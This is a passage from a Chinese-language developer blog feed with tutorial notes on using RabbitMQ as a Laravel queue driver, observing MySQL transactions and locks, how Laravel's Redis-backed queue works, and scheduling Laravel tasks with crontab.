        <content type="html"><![CDATA[<p>这篇笔记用来记录如何在Laravel 中使用RabbitMQ。</p><a id="more"></a><p>Laravel 自带了那么多队列，为什么还要使用其他队列？</p><p>这是因为Laravel 的队列，通常是基于Redis、Database的Driver，使用起来有一定的局限性。</p><p>使用专业的队列，有如下优点：</p><ol><li>性能更好</li><li>提供可靠性消息投递模式、返回模式</li><li>保证数据不丢失的前提下做到高可靠性、可用性</li></ol><p>如果还不知道Rabbit MQ 是什么，可以看一下我的另一篇笔记——<a href="https://www.0x2beace.com/rabbitmq-quick-start/">RabbitMQ 快速上手</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Laravel 并没有默认为我们提供 RabbitsMQ Driver，所幸一些勤劳的人，帮我们完成了一些艰苦的工作——<a href="https://github.com/vyuldashev/laravel-queue-rabbitmq" target="_blank" rel="noopener">RabbitMQ Queue driver for Laravel</a>。</p><p>引入依赖：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require vladimir-yuldashev/laravel-queue-rabbitmq</span><br></pre></td></tr></table></figure><p>编辑<code>config/queue.php</code>，加入一个新的连接：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'connections'</span> =&gt; [</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="string">'rabbitmq'</span> =&gt; [</span><br><span class="line">    </span><br><span class="line">       <span class="string">'driver'</span> =&gt; <span class="string">'rabbitmq'</span>,</span><br><span class="line">       <span class="string">'queue'</span> =&gt; env(<span class="string">'RABBITMQ_QUEUE'</span>, <span class="string">'default'</span>),</span><br><span class="line">       <span class="string">'connection'</span> =&gt; PhpAmqpLib\Connection\AMQPLazyConnection::class,</span><br><span class="line">   </span><br><span class="line">       <span class="string">'hosts'</span> =&gt; [</span><br><span class="line">           [</span><br><span class="line">               <span class="string">'host'</span> =&gt; env(<span class="string">'RABBITMQ_HOST'</span>, <span class="string">'127.0.0.1'</span>),</span><br><span class="line">               <span class="string">'port'</span> =&gt; env(<span class="string">'RABBITMQ_PORT'</span>, <span class="number">5672</span>),</span><br><span class="line">               <span class="string">'user'</span> =&gt; env(<span class="string">'RABBITMQ_USER'</span>, <span class="string">'guest'</span>),</span><br><span class="line">               <span class="string">'password'</span> =&gt; env(<span class="string">'RABBITMQ_PASSWORD'</span>, <span class="string">'guest'</span>),</span><br><span class="line">               <span class="string">'vhost'</span> =&gt; env(<span class="string">'RABBITMQ_VHOST'</span>, <span class="string">'/'</span>),</span><br><span class="line">           ],</span><br><span class="line">       ],</span><br><span class="line">   </span><br><span class="line">       <span class="string">'options'</span> =&gt; [</span><br><span class="line">           <span class="string">'ssl_options'</span> =&gt; [</span><br><span class="line">               <span class="string">'cafile'</span> =&gt; env(<span class="string">'RABBITMQ_SSL_CAFILE'</span>, <span class="keyword">null</span>),</span><br><span class="line">               <span class="string">'local_cert'</span> =&gt; env(<span class="string">'RABBITMQ_SSL_LOCALCERT'</span>, <span class="keyword">null</span>),</span><br><span class="line">               <span class="string">'local_key'</span> =&gt; env(<span class="string">'RABBITMQ_SSL_LOCALKEY'</span>, <span class="keyword">null</span>),</span><br><span class="line">               <span class="string">'verify_peer'</span> =&gt; env(<span class="string">'RABBITMQ_SSL_VERIFY_PEER'</span>, <span class="keyword">true</span>),</span><br><span class="line">               <span class="string">'passphrase'</span> =&gt; env(<span class="string">'RABBITMQ_SSL_PASSPHRASE'</span>, <span class="keyword">null</span>),</span><br><span class="line">           ],</span><br><span class="line">           <span class="string">'queue'</span> =&gt; [</span><br><span class="line">               <span class="string">'job'</span> =&gt; VladimirYuldashev\LaravelQueueRabbitMQ\Queue\Jobs\RabbitMQJob::class,</span><br><span class="line">           ],</span><br><span class="line">       ],</span><br><span class="line">   </span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * Set to "horizon" if you wish to use Laravel Horizon.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="string">'worker'</span> =&gt; env(<span class="string">'RABBITMQ_WORKER'</span>, <span class="string">'default'</span>),</span><br><span class="line">        </span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...    </span></span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>最后编辑<code>.env</code>，将<code>QUEUE_CONNECTION</code> 改成 <code>rabbitmq</code>，同时加入以下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RABBITMQ_HOST=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">RABBITMQ_PORT=<span class="number">5672</span></span><br><span class="line">RABBITMQ_USER=guest</span><br><span class="line">RABBITMQ_PASSWORD=guest</span><br></pre></td></tr></table></figure><p>至此，基本的配置工作就完成了，如果需要查看更多配置选项，可以查看<a href="https://github.com/vyuldashev/laravel-queue-rabbitmq#optional-config" target="_blank" rel="noopener">文档</a>。</p><p>RabbitMQ Queue 的使用是遵守Laravel 队列API的，也就是说，只需要将Driver 设置为 rabbitmq，我们根本无需关心底层的连接是如何实现的，就像正常使用Laravel 队列那样就好。</p><p>如果你不知道如何使用Laravel 队列API，请查阅<a href="http://laravel.com/docs/queues" target="_blank" rel="noopener">官方文档</a>。</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>首先创建一个Job，来感受一下RabbitMQ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:job RabbitMQJob</span><br></pre></td></tr></table></figure><p>入队：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">"rabbitmq"</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    dispatch(<span class="keyword">new</span> \App\Jobs\RabbitMQJob())-&gt;onQueue(<span class="string">"rabbitmq-job"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"ok"</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>请求一下 <code>127.0.0.1:8000/rabbitmq</code>，<strong>生产/投递</strong>一个<strong>任务/消息</strong>到<code>rabbitmq-job</code> 队列中。</p><p>然后打开RabbitMQ 管控台——<code>http://localhost:15672</code>，可以看到多出了一个名为<code>rabbitmq-job</code> 的队列：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210718220527.png" alt=""></p><p>可以看到Ready 的数量是 1，表示该队列中等待消费的消息数量是 1，如果再次请求接口，就会发现Ready 的数量变成了 2。</p><p>此时如果没有消费者去主动消费，那么消息则一直存在于队列中。</p><p>尝试指定队列开始消费：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan queue:work --queue rabbitmq-job</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210718220539.png" alt=""></p><p>这个就是消费者进行消费的过程。</p><p>再次查看管控台，可以发现Ready 的数量变成了 0。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210718220547.png" alt=""></p><p>这个就是RabbitMQ 在Laravel 中的基本使用，还是很容易上手的。</p><h2 id="延时队列"><a href="#延时队列" class="headerlink" title="延时队列"></a>延时队列</h2><p>队列的另一个常见的使用场景就是——延时队列。</p><p>在使用Redis 作为Driver 时，可以很轻松使用<code>delay</code> API 实现延迟任务。</p><p>但是对于RabbitMQ而言，如果只是调用<code>delay</code> API，就会发现消息不会被消费。</p><p>于是去查阅官方文档，看看是不是哪里的配置没有启用。但遗憾的发现，文档中并没有说明延时队列的使用方式。</p><p>最后抱着一丝侥幸在这个<a href="https://github.com/vyuldashev/laravel-queue-rabbitmq/issues/342#issuecomment-659209409" target="_blank" rel="noopener">Issues</a> 下找到了答案。</p><p>可以发现，决定因素就是下面这行代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Artisan::call(<span class="string">'rabbitmq:queue-declare'</span>, [<span class="string">'name'</span> =&gt; <span class="keyword">$this</span>-&gt;queue]);</span><br></pre></td></tr></table></figure><p>这行代码的意思就是，调用一个Artisan 命令，而这个命令则会生成一个队列。</p><blockquote><p>这个命令是哪里来的？</p></blockquote><p>这是RabbitMQ Queue 扩展包封装的。</p><p>类似命令还有以下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rabbitmq:consume              Consume messages</span><br><span class="line">rabbitmq:exchange-<span class="keyword">declare</span>     <span class="keyword">Declare</span> exchange</span><br><span class="line">rabbitmq:exchange-delete      Delete exchange</span><br><span class="line">rabbitmq:queue-bind           Bind queue to exchange</span><br><span class="line">rabbitmq:queue-<span class="keyword">declare</span>        <span class="keyword">Declare</span> queue</span><br><span class="line">rabbitmq:queue-delete         Delete queue</span><br><span class="line">rabbitmq:queue-purge          Purge all messages in queue</span><br></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>使用RabbitMQ 作为Laravel 队列驱动，使得Laravel 队列的可扩展性更高了。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
            <tag> RabbitMQ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈 Mysql 事务与锁</title>
      <link href="/talking-about-mysql-transaction-and-lock/"/>
      <url>/talking-about-mysql-transaction-and-lock/</url>
      
        <content type="html"><![CDATA[<p>事务是Mysql InnoDB 引擎的一个重要特点，具有ACID 四个特性。</p><a id="more"></a><ul><li>原子性（Atomicity）：事务的所有操作，要么全部完成，要么全部不完成，不会结束在某个中间环节。</li><li>一致性（Consistency）：事务开始之前和事务结束之后，数据库的完整性限制未被破坏。</li><li>隔离性（Isolation）：两个或者多个事务的执行是互不干扰的，一个事务不可能看到其他事务运行时，中间某一时刻的数据。</li><li>持久性（Durability）：事务完成之后，事务所做的修改进行持久化保存，不会丢失。</li></ul><p>平时项目和工作中，会很频繁使用到事务，但是，一些细节如果不稍加注意，是很容易出现问题的。</p><h2 id="观察事务"><a href="#观察事务" class="headerlink" title="观察事务"></a>观察事务</h2><h3 id="示例一"><a href="#示例一" class="headerlink" title="示例一"></a>示例一</h3><p>这是一段很常见的代码，逻辑也很简单，首先开启事务，如果<code>try</code> 代码块没有异常，提交事务; 如果<code>try</code> 代码块遇到异常，事务进行回滚。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">"test"</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    DB::beginTransaction();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        \App\Models\User\UserModel::whereUid(<span class="number">7</span>)</span><br><span class="line">            -&gt;update([</span><br><span class="line">                <span class="string">"balance"</span> =&gt; <span class="string">"1000"</span>,</span><br><span class="line">            ]);</span><br><span class="line">        DB::commit();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $exception) &#123;</span><br><span class="line">        DB::rollBack();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"操作失败"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这个过程中，我们只知道，手动选择了开启、提交或者回滚事务，但是对于事务执行的整个过程，比如：什么时候开启了事务、什么时候提交的事务、我们都是毫无感知的。</p><p>那有没有什么办法，可以看到整个过程呢？</p><p>答案是有的。</p><h3 id="示例二"><a href="#示例二" class="headerlink" title="示例二"></a>示例二</h3><p>在新的代码示例中，只加了一行代码，它的作用是<strong>延缓事务提交</strong>（这里 sleep 15秒，便于观察）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">"sleep15"</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    DB::beginTransaction();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        \App\Models\User\UserAccountModel::whereUid(<span class="number">7</span>)</span><br><span class="line">            -&gt;update([</span><br><span class="line">                <span class="string">"balance"</span> =&gt; <span class="string">"2000"</span>,</span><br><span class="line">            ]);</span><br><span class="line">        sleep(<span class="number">15</span>);</span><br><span class="line">        DB::commit();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $exception) &#123;</span><br><span class="line">        DB::rollBack();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"操作失败"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>同时需要配合Mysql 客户端，执行一个SQL 语句，查看正在进行中的事务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM information_schema.INNODB_TRX;</span><br></pre></td></tr></table></figure><p>可以在发送请求之前先执行一次：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210718105708.png" alt=""></p><p>发送请求之后执行一次：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210718105734.png" alt=""></p><p>请求结束之后再执行一次：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210718105708.png" alt=""></p><p>可以很清晰地看到，事务从无到有再到无的整个过程：</p><ol><li>发送请求之前，此时事务还没有开启。</li><li>发送请求之后，此时事务已开启，但因为sleep 的原因，没法直接提交或者回滚，只能一直开启事务等待。</li><li>sleep 结束，此时事务进行提交或回滚，请求结束。</li></ol><p>往往因为事务使用不当，而造成锁表等问题，原因大多出在了第二步上。</p><h2 id="观察锁"><a href="#观察锁" class="headerlink" title="观察锁"></a>观察锁</h2><p>Mysql 的锁（这篇笔记就不对锁的分类具体展开说明了），往往都是伴随事务出现。</p><p>为了演示『锁』是如何产生的，这次需要同时用到上面的两个示例。</p><p>首先请求<code>127.0.0.1:8000/sleep15</code>，在请求结束之前，请求<code>127.0.0.1:8000/test</code> 。</p><p>此时观察请求状态，可以发现两个接口都没有马上响应。</p><p>再次打开Mysql 客户端，查看当前正在进行中的事务：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210718105913.png" alt=""></p><p>不出意外，可以发现此时等待的事务变成了两个。</p><p>通过<code>trx_id</code> 大小，可以判断出，先请求的<code>127.0.0.1:8000/sleep15</code> 事务当前正在运行中，而后面请求的<code>127.0.0.1:8000/test</code> 事务，则是被锁住等待，等待前面的事务释放（提交或者回滚）。</p><p>同理，如果此时请求不是两个，而是多个，相应的，被锁住的事务就是多个。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210718105924.png" alt=""></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这个问题看着挺简单的，但实际开发时，往往容易被忽略。</p><p>过早开启事务，提交或者回滚事务之前，穿插许多其他业务逻辑，如果其他某个逻辑超时，则会导致事务不能及时释放，从而出现连锁反应。</p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Queue 必知必会</title>
      <link href="/laravel-queue-must-know-and-know/"/>
      <url>/laravel-queue-must-know-and-know/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记转载于——<a href="http://lijinma.com/blog/2017/01/31/laravel-queue/" target="_blank" rel="noopener">使用 Laravel Queue 不得不明白的知识</a>。</p><a id="more"></a><p>我觉得这篇文章就属于就那种写得比较好的文章，原因如下：</p><p>授人鱼不如授人以渔。一般的文章通常只是教你如何使用，用完之后，你定是知其然不知其所以然。而这篇文章则是从“底层原理”的角度，去了解Laravel Queue。</p><h2 id="命令详解"><a href="#命令详解" class="headerlink" title="命令详解"></a>命令详解</h2><p>使用过Laravel Queue 的你，一定也会对这个命令感到很熟悉，通常我们需要对某个队列进行消费时，会执行这个命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan queue:work --daemon --quiet --queue=default --delay=3 --sleep=3 --tries=3</span><br></pre></td></tr></table></figure><p>这个命令有很多参数，一起来看看吧：</p><ul><li><code>--daemon</code>：以守护进程的方式运行队列，通常会在生产环境中使用到。</li><li><code>--quiet</code>：不输出任何内容</li><li><code>--delay=3</code>：一个任务失败后，延迟多长时间后再重试（单位是秒）</li><li><code>--sleep=3</code>：去队列中消费时，如果发现没有任务，休息多长时间（单位是秒）</li><li><code>--tries=3</code>：定义失败任务最多重试次数</li></ul><h2 id="当我们-dispatch-一个Job-之后，倒底发生了哪些事情"><a href="#当我们-dispatch-一个Job-之后，倒底发生了哪些事情" class="headerlink" title="当我们 dispatch 一个Job 之后，倒底发生了哪些事情"></a>当我们 <code>dispatch</code> 一个<code>Job</code> 之后，倒底发生了哪些事情</h2><p>这里为了方便调试及理解，需要先将 Queue driver 设置为<code>redis</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QUEUE_CONNECTION=redis</span><br></pre></td></tr></table></figure><p>首先得创建一个Job：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:job ExampleJob</span><br></pre></td></tr></table></figure><p>进入<code>redis-cli</code>，执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; monitor</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>然后打开Tinker，分配一个任务：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dispatch(<span class="keyword">new</span> \App\Jobs\ExampleJob());</span><br></pre></td></tr></table></figure><p>再次观察redis-cli 控制台。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1626490482.711473 [0 127.0.0.1:64056] <span class="string">"SELECT"</span> <span class="string">"0"</span></span><br><span class="line">1626490482.719953 [0 127.0.0.1:64056] <span class="string">"EVAL"</span> <span class="string">"-- Push the job onto the queue...\nredis.call('rpush', KEYS[1], ARGV[1])\n-- Push a notification onto the \"notify\" queue...\nredis.call('rpush', KEYS[2], 1)"</span> <span class="string">"2"</span> <span class="string">"queues:default"</span> <span class="string">"queues:default:notify"</span> <span class="string">"&#123;\"uuid\":\"d945da70-8c68-47d7-86c6-f631a4da6296\",\"displayName\":\"App\\\\Jobs\\\\ExampleJob\",\"job\":\"Illuminate\\\\Queue\\\\CallQueuedHandler@call\",\"maxTries\":null,\"maxExceptions\":null,\"failOnTimeout\":false,\"backoff\":null,\"timeout\":null,\"retryUntil\":null,\"data\":&#123;\"commandName\":\"App\\\\Jobs\\\\ExampleJob\",\"command\":\"O:19:\\\"App\\\\Jobs\\\\ExampleJob\\\":10:&#123;s:3:\\\"job\\\";N;s:10:\\\"connection\\\";N;s:5:\\\"queue\\\";N;s:15:\\\"chainConnection\\\";N;s:10:\\\"chainQueue\\\";N;s:19:\\\"chainCatchCallbacks\\\";N;s:5:\\\"delay\\\";N;s:11:\\\"afterCommit\\\";N;s:10:\\\"middleware\\\";a:0:&#123;&#125;s:7:\\\"chained\\\";a:0:&#123;&#125;&#125;\"&#125;,\"id\":\"OjbqA9m9x7VsdzNds6JXImwYI86j0E9H\",\"attempts\":0&#125;"</span></span><br><span class="line">1626490482.725191 [0 lua] <span class="string">"rpush"</span> <span class="string">"queues:default"</span> <span class="string">"&#123;\"uuid\":\"d945da70-8c68-47d7-86c6-f631a4da6296\",\"displayName\":\"App\\\\Jobs\\\\ExampleJob\",\"job\":\"Illuminate\\\\Queue\\\\CallQueuedHandler@call\",\"maxTries\":null,\"maxExceptions\":null,\"failOnTimeout\":false,\"backoff\":null,\"timeout\":null,\"retryUntil\":null,\"data\":&#123;\"commandName\":\"App\\\\Jobs\\\\ExampleJob\",\"command\":\"O:19:\\\"App\\\\Jobs\\\\ExampleJob\\\":10:&#123;s:3:\\\"job\\\";N;s:10:\\\"connection\\\";N;s:5:\\\"queue\\\";N;s:15:\\\"chainConnection\\\";N;s:10:\\\"chainQueue\\\";N;s:19:\\\"chainCatchCallbacks\\\";N;s:5:\\\"delay\\\";N;s:11:\\\"afterCommit\\\";N;s:10:\\\"middleware\\\";a:0:&#123;&#125;s:7:\\\"chained\\\";a:0:&#123;&#125;&#125;\"&#125;,\"id\":\"OjbqA9m9x7VsdzNds6JXImwYI86j0E9H\",\"attempts\":0&#125;"</span></span><br><span class="line">1626490482.726123 [0 lua] <span class="string">"rpush"</span> <span class="string">"queues:default:notify"</span> <span class="string">"1"</span></span><br></pre></td></tr></table></figure><p>正常可以看到以上输出，说明我们的Job 已经成功放入队列中了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; keys queue*</span><br><span class="line">1) <span class="string">"queues:default"</span></span><br><span class="line">2) <span class="string">"queues:default:notify"</span></span><br></pre></td></tr></table></figure><p>此时，如果执行<code>php artisan work</code>，则开始会消费队列：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php artisan queue:work --queue=default                                               </span><br><span class="line">[2021-07-17 11:36:46][hpDVkINqhtLCi9jKqQKveC6utwX3C8jS] Processing: App\Jobs\ExampleJob</span><br><span class="line">[2021-07-17 11:36:46][hpDVkINqhtLCi9jKqQKveC6utwX3C8jS] Processed:  App\Jobs\ExampleJob</span><br></pre></td></tr></table></figure><p>通过分析上面的输出，可以知道队列在Redis 的消费过程应该是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  首先从 queue:default List 中取出任务</span></span><br><span class="line"><span class="string">"lpop"</span> <span class="string">"queues:default"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 暂存到queues:default:reserved Zset 中</span></span><br><span class="line"><span class="string">"zadd"</span> <span class="string">"queues:default:reserved"</span> <span class="string">"1626493456"</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务执行完毕后， 从 queues:default:reserved Zset 中删除</span></span><br><span class="line"><span class="string">"zrem"</span> <span class="string">"queues:default:reserved"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果任务失败，会放到 queue:default:delay zset 中</span></span><br></pre></td></tr></table></figure><p>转载文章是作者在Laravel <code>5.x</code> 版本时写的，时至如今，Laravel 已发布至<code>8.x</code> ，队列消费的细节可能发生了一些变化，但是核心的逻辑还是没变。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
          <category> MQ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> MQ </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel 如何执行定时任务</title>
      <link href="/how-does-laravel-perform-timing-tasks/"/>
      <url>/how-does-laravel-perform-timing-tasks/</url>
      
        <content type="html"><![CDATA[<p>Laravel 如何执行定义任务？或者说如何设计定义任务的执行？</p><a id="more"></a><p>第一个想到的肯定是设置 crontab 定时任务，但是 crontab 所做的事情通常是，每隔一个时间段执行一次某个命令。</p><p>假设我们现在的需求是，每天晚上的十二点，去清理一次数据库。</p><p>那么如何将这件事情与 crontab 的定时任务关联起来呢？难道要写一个PHP 脚本，交给 crontab 每天凌晨执行一次？</p><p>这当然是一个办法，但是在Laravel 中有更好的方案——<a href="https://learnku.com/docs/laravel/8.x/scheduling/9399" target="_blank" rel="noopener">任务调度</a>。</p><h2 id="新建Artisan-命令"><a href="#新建Artisan-命令" class="headerlink" title="新建Artisan 命令"></a>新建Artisan 命令</h2><p>使用以下生成命令类：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:<span class="built_in">command</span> DataCleaning --<span class="built_in">command</span>=system:data-cleaning</span><br></pre></td></tr></table></figure><p>在<code>handle</code> 中，编写『数据清理』的逻辑。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Console</span>\<span class="title">Commands</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Console</span>\<span class="title">Command</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CalculateActiveUser</span> <span class="keyword">extends</span> <span class="title">Command</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 供我们调用命令</span></span><br><span class="line">    <span class="keyword">protected</span> $signature = <span class="string">'larabbs:calculate-active-user'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 命令的描述</span></span><br><span class="line">    <span class="keyword">protected</span> $description = <span class="string">'生成活跃用户'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最终执行的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 数据清理</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><p>Laravel 命令调度器允许我们在 Laravel 中对命令调度进行清晰流畅的定义，并且仅需要在服务器上增加一条 crontab 任务即可。</p><p>调度在 <code>app/Console/Kernel.php</code> 文件的 <code>schedule</code> 方法中定义。</p><p>设置系统定时任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">// 填入以下内容</span><br><span class="line">* * * * * php /your_project_absolute_path schedule:run &gt;&gt; /dev/null 